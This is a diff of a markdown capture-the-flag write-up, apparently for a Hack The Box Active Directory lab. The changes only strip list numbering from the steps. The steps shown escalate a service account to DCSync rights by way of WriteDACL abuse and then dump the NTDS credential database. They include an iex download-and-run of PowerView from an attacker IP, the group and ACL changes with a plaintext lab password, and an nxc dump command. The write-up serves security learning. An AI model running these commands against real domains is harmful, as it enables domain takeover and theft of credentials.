@@ -84,19 +84,19 @@ The `svc-alfresco` user was a member of the **Account Operators** group. This gr
 
 The Exchange Windows Permissions group had **WriteDACL** privileges over the **htb.local** domain object. Therefore, by adding `svc-alfresco` to Exchange Windows Permissions, it was possible to abuse **WriteDACL** and grant `svc-alfresco` **DCSync** rights over the domain.
 
-1. First, `powerview.ps` was loaded in memory.
+First, `powerview.ps` was loaded in memory.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.107:80/powerview.ps1')
 ```
 
-2. Then, `svc-alfresco` was added to the **Exchange Windows Permissions** group.
+Then, `svc-alfresco` was added to the **Exchange Windows Permissions** group.
 
 ```powershell
 *Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
 ```
 
-3. After that, a credential object was created for `svc-alfresco` and ysing the newly abused ACL path, **DCSync** rights were granted to `svc-alfresco`.
+After that, a credential object was created for `svc-alfresco` and ysing the newly abused ACL path, **DCSync** rights were granted to `svc-alfresco`.
 
 ```powershell
 $pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
@@ -105,7 +105,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco',
 Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity svc-alfresco -TargetIdentity 'htb.local\domain admins' -Rights DCSync
 ```
 
-4. With **DCSync** privileges assigned, the NTDS database was dumped remotely.
+With **DCSync** privileges assigned, the NTDS database was dumped remotely.
 
 ```bash
 └─$ nxc smb 10.129.200.15 -u svc-alfresco -p 's3rvice' --ntds       
